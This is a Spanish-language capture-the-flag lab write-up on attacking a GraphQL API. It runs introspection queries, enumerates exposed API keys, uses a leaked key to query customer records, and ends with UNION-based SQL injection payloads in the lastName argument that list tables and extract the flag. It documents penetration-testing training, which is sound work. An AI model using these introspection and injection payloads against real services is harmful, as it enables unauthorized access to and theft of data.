---
description: 'Target(s): 94.237.55.43:30165'
---

# Attacking GraphQL

## Escenario

Se le ha encomendado realizar una evaluación de seguridad de la aplicación web de un cliente. Aplique lo que ha aprendido en este módulo para obtener la flag.

**Pregunta 1**: Aprovecha la vulnerabilidad de la API GraphQL para obtener la flag.

1. Accedemos al endpoint /graphql desde el navegador:

<figure><img src="../../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

2. Haremos una query de las queries de GraphQL permitidas:

```graphql
{
    __schema {
        queryType {
            fields {
                name
                description
            }
        }
    }
}
```

<figure><img src="../../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

**Target**(s): 83.136.252.171:47901

3. Ejecutamos una query de introspection para mostrar los types del schema:

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

<figure><img src="../../../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

4. Hay varios que podrían interesarnos como los de Add, el de Mutation, etc. Obtendremos el nombre de todos los campos del type AddEmployee con otra query:

```graphql
{
  __type(name: "AddEmployee") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

<figure><img src="../../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

5. Hacemos lo mismo con el type Mutation:

```graphql
{
  __type(name: "Mutation") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

<figure><img src="../../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

6. Ejecutamos la query de schema que nos da GraphQL Voyager:

```graphql
query IntrospectionQuery {
      __schema {
        
        queryType { name kind }
        mutationType { name kind }
        subscriptionType { name kind }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
      
      
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  
```

<figure><img src="../../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

7. Copiamos y pegamos el resultado que nos da en GraphQL Voyager y le damos a display:

<figure><img src="../../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

8. Visualizando el esquema vamos a intentar obtener activeApiKeys:

```graphql
{
  __type(name: "ApiKeyObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

<figure><img src="../../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

9. Enumeramos las API keys existentes:

```graphql
{
  activeApiKeys {
    id
    role
    key
  }
}
```

<figure><img src="../../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

10. Antes en la consulta de GraphQL Voyager hemos identificado que hay dos queries que requieren API KEY:
    1. allCustomers
    2. customerByName

<figure><img src="../../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

11. Ejecutamos primero la query allCustomers:

```graphql
{
  allCustomers(apiKey: "0711a879ed751e63330a78a4b195bbad") {
    id
    firstName
    lastName
    address
  }
}
```

<figure><img src="../../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

12. Ejecutamos la query customerByName indicando el lastName ahora que los tenemos disponibles:

<figure><img src="../../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

```graphql
{
  customerByName(
    apiKey: "0711a879ed751e63330a78a4b195bbad",
    lastName: "Blair"
  ) {
    id
    firstName
    lastName
    address
  }
}
```

<figure><img src="../../../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

13. Lo repetimos con los otros 2 usuarios:

<figure><img src="../../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

14. Los ID coinciden y parecen estar codificados en base64:

<figure><img src="../../../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

**Target**(s): 94.237.56.254:54956

15. Continuamos utilizando la API key, esta vez para una inyección SQL y obtener los nombres de tablas de la bbdd:

```graphql
{
  customerByName(
    apiKey: "0711a879ed751e63330a78a4b195bbad",
    lastName: "' UNION SELECT table_name, table_name, table_name, table_name FROM information_schema.tables-- "
  ) {
    firstName
    lastName
    address
  }
}
```

<figure><img src="../../../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

16. La primera tabla que identificamos es ALL\_PLUGINS. Vamos a identificar el resto con el siguiente payload que hemos visto en la teoría pero adaptado a este escenario:

```graphql
{
  customerByName(
    apiKey: "0711a879ed751e63330a78a4b195bbad",
    lastName: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4 FROM information_schema.tables WHERE table_schema=database()-- -"
  ) {
    firstName
    lastName
    address
  }
}
```

<figure><img src="../../../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

17. Hemos identificado la tabla flag. Utilizaremos el siguiente payload para extrar la flag:

```graphql
{
  customerByName(
    apiKey: "0711a879ed751e63330a78a4b195bbad",
    lastName: "x' UNION SELECT 1,2,GROUP_CONCAT(flag),4 FROM flag-- -"
  ) {
    firstName
    lastName
    address
  }
}
```

<figure><img src="../../../../.gitbook/assets/Sin título.png" alt=""><figcaption></figcaption></figure>
